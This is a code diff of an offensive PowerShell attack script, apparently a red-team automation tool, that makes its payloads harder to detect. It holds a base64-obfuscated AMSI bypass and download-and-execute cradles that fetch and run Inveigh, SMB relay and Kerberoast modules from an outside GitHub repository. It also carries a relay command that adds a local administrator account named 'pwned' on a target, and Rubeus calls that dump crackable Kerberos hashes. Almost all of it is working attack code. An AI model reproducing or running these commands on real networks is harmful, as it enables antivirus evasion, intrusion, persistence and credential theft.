@@ -8,7 +8,7 @@ function Unzip
 }
 function AmsiBypass
 {
-    (([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
+    (([Ref].Assembly.gettypes() | ? {$_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQAqAHQAaQBsAHMA')))}).GetFields($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))) | ? {$_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0ACoAYQBpAGwAZQBkAA==')))}).SetValue($null,$true)
 }
 
 function dependencychecks
@@ -291,10 +291,10 @@ function Inveigh {
         $Wcl = new-object System.Net.WebClient
         $Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
 
-        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Inveigh-Relay.ps1")
-        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-SMBClient.ps1")
-        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-SMBEnum.ps1")
-        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-SMBExec.ps1")
+        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/Invoke-InveighRelay.ps1")
+        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/Invoke-SMBClient.ps1")
+        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/Invoke-SMBEnum.ps1")
+        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/Invoke-SMBExec.ps1")
 
         Invoke-InveighRelay -ConsoleOutput Y -StatusOutput N -Target $target -Command "net user pwned 0WnedAccount! /add; net localgroup $admingroup pwned /add" -Attack Enumerate,Execute,Session
 
@@ -306,23 +306,23 @@ function Inveigh {
     {   
         if (isadmin)
         {
-                cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/amsi.ps1');IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -ADIDNS Combo -ADIDNSThreshold 2 -IP $IPaddress.IPv4Address.IPAddress -FileOutput Y -FileOutputDirectory $currentPath\;}
+                cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/amsi.ps1');IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -ADIDNS Combo -ADIDNSThreshold 2 -IP $IPaddress.IPv4Address.IPAddress -FileOutput Y -FileOutputDirectory $currentPath\;}
 		}
         else 
         {
-               cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/amsi.ps1');IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -ADIDNS Combo -ADIDNSThreshold 2 -IP $IPaddress.IPv4Address.IPAddress -FileOutput Y -FileOutputDirectory $currentPath\;}
+               cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/amsi.ps1');IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -ADIDNS Combo -ADIDNSThreshold 2 -IP $IPaddress.IPv4Address.IPAddress -FileOutput Y -FileOutputDirectory $currentPath\;}
 	    }
     }
     else
     {
         if (isadmin)
         {
-                cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/amsi.ps1');IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -IP $IPaddress.IPv4Address.IPAddress -FileOutput Y -FileOutputDirectory $currentPath\;}
+                cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/amsi.ps1');IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -IP $IPaddress.IPv4Address.IPAddress -FileOutput Y -FileOutputDirectory $currentPath\;}
 		
         }
         else 
         {
-               cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/amsi.ps1');IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -FileOutput Y -IP $IPaddress.IPv4Address.IPAddress -FileOutputDirectory $currentPath\;}
+               cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/amsi.ps1');IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -FileOutput Y -IP $IPaddress.IPv4Address.IPAddress -FileOutputDirectory $currentPath\;}
 	       
         }
     }
@@ -2010,7 +2010,7 @@ function kerberoasting
 	Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/Ghostpack/Rubeus.exe -argument1 asreproast -argument2 "/format:hashcat" >> $currentPath\Exploitation\ASreproasting.txt
 	Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/Ghostpack/Rubeus.exe -argument1 kerberoast -argument2 "/format:hashcat" >> $currentPath\Exploitation\Kerberoasting_Rubeus.txt
     Write-Host -ForegroundColor Yellow 'Using the powershell version for sure'
-    cmd /c start powershell -Command {$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/amsi.ps1');IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-Kerberoast -OutputFormat Hashcat | fl >> $currentPath\Exploitation\Kerberoasting.txt;Write-Host -ForegroundColor Yellow ''Module finished, Hashes saved to .\Exploitation\Kerberoasting.txt:'' ;pause}
+    cmd /c start powershell -Command {$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/amsi.ps1');IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/Invoke-Kerberoast.ps1');Invoke-Kerberoast -OutputFormat Hashcat | fl >> $currentPath\Exploitation\Kerberoasting.txt;Write-Host -ForegroundColor Yellow ''Module finished, Hashes saved to .\Exploitation\Kerberoasting.txt:'' ;pause}
 }
 
 function inv-phantom {
